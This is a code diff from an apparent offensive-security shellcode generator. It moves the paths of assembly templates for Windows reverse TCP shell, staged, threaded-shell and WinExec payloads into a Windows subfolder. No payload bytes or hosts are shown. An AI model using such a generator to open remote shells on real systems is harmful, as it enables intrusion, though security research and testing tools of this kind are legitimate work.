@@ -67,7 +67,7 @@ def GenerateCDRTShell(Ip: str, Port: str):
     HexIp = LibDebug.IpToHex(Ip)
     HexPort = LibDebug.PortToHex(Port)
     Content = ""
-    with open(".\ASM/ShellCodes/Custom_Dynamic_ReverseTCP_Shell.asm", mode='r+') as f:
+    with open(".\ASM/ShellCodes/Windows/Custom_Dynamic_ReverseTCP_Shell.asm", mode='r+') as f:
         Content = f.read()
     NullByteTrigger = False
     for i in range(0, len(HexIp), 2):
@@ -108,7 +108,7 @@ def GenerateCDRTS():
     Generate a Dynamic Reverse TCP Staged shellcode.
     -return string
     '''
-    return ReadSHELLCODE(".\ASM/ShellCodes/Custom_Dynamic_ReverseTCP_Staged.asm")
+    return ReadSHELLCODE(".\ASM/ShellCodes/Windows/Custom_Dynamic_ReverseTCP_Staged.asm")
 
 
 def GenerateCDRTTShell():
@@ -116,7 +116,7 @@ def GenerateCDRTTShell():
     Generate a Dynamic Reverse TCP Threaded Shell shellcode.
     -return string
     '''
-    return ReadSHELLCODE(".\ASM/ShellCodes/Custom_Dynamic_ReverseTCP_Threaded_Shell.asm")
+    return ReadSHELLCODE(".\ASM/ShellCodes/Windows/Custom_Dynamic_ReverseTCP_Threaded_Shell.asm")
 
 
 def GenerateWinExec(command: str):
@@ -137,7 +137,7 @@ def GenerateWinExec(command: str):
                 bytearray.fromhex(ebyte).decode()+"\n"
             ebyte = ""
     Content = ""
-    with open(".\ASM/ShellCodes/Custom_Dynamic_WinExec.asm", mode='r+') as f:
+    with open(".\ASM/ShellCodes/Windows/Custom_Dynamic_WinExec.asm", mode='r+') as f:
         Content = f.read()
     for i in range(0, len(Content)):
         if 'push 0x636c6163 ; HEAPNOS' in Content:
